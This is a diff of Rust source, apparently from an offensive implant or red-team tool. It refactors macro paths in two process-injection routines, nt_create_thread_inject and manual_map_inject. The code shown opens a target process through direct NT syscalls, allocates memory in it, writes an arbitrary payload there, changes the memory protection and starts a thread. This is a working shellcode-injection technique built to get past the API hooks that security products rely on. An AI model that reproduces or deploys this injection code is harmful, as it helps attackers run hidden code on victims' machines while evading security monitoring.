@@ -71,7 +71,7 @@ pub(crate) fn nt_create_thread_inject(
 
     unsafe {
         let mut h_proc: usize = 0;
-        let open_status = syscall!(
+        let open_status = crate::syscall!(
             "NtOpenProcess",
             &mut h_proc as *mut _ as u64,
             access_mask as u64,
@@ -86,7 +86,7 @@ pub(crate) fn nt_create_thread_inject(
 
         macro_rules! close_h {
             ($h:expr) => {
-                syscall!("NtClose", $h as u64).ok();
+                crate::syscall!("NtClose", $h as u64).ok();
             };
         }
         macro_rules! cleanup_and_err {
@@ -94,12 +94,16 @@ pub(crate) fn nt_create_thread_inject(
                 close_h!(h_proc);
                 return Err(anyhow::anyhow!($msg));
             }};
+            ($fmt:expr, $($arg:tt)*) => {{
+                close_h!(h_proc);
+                return Err(anyhow::anyhow!($fmt, $($arg)*));
+            }};
         }
 
         // Allocate RW memory.
         let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
         let mut alloc_size = payload.len();
-        let s = syscall!(
+        let s = crate::syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64, &mut remote_mem as *mut _ as u64,
             0u64, &mut alloc_size as *mut _ as u64,
@@ -115,7 +119,7 @@ pub(crate) fn nt_create_thread_inject(
 
         // Write payload.
         let mut written = 0usize;
-        let s = syscall!(
+        let s = crate::syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64, remote_mem as u64,
             payload.as_ptr() as u64, payload.len() as u64,
@@ -138,7 +142,7 @@ pub(crate) fn nt_create_thread_inject(
         let mut old_prot = 0u32;
         let mut prot_base = remote_mem as usize;
         let mut prot_size = payload.len();
-        let s = syscall!(
+        let s = crate::syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64, &mut prot_base as *mut _ as u64,
             &mut prot_size as *mut _ as u64,
@@ -151,7 +155,7 @@ pub(crate) fn nt_create_thread_inject(
 
         // Flush I-cache before creating the new thread.  Required for
         // correctness on ARM64 and defense-in-depth on x86_64.
-        syscall!(
+        crate::syscall!(
             "NtFlushInstructionCache",
             h_proc as u64, remote_mem as u64, payload.len() as u64,
         ).ok();
@@ -284,7 +288,7 @@ fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             | winapi::um::winnt::PROCESS_VM_WRITE
             | winapi::um::winnt::PROCESS_VM_READ
             | winapi::um::winnt::PROCESS_CREATE_THREAD) as u64;
-        let open_status = syscall!(
+        let open_status = crate::syscall!(
             "NtOpenProcess",
             &mut h_proc as *mut _ as u64,
             access_mask,
@@ -299,7 +303,7 @@ fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         struct HandleGuard(*mut winapi::ctypes::c_void);
         impl Drop for HandleGuard {
             fn drop(&mut self) {
-                syscall!("NtClose", self.0 as u64).ok();
+                crate::syscall!("NtClose", self.0 as u64).ok();
             }
         }
         let _guard = HandleGuard(process);
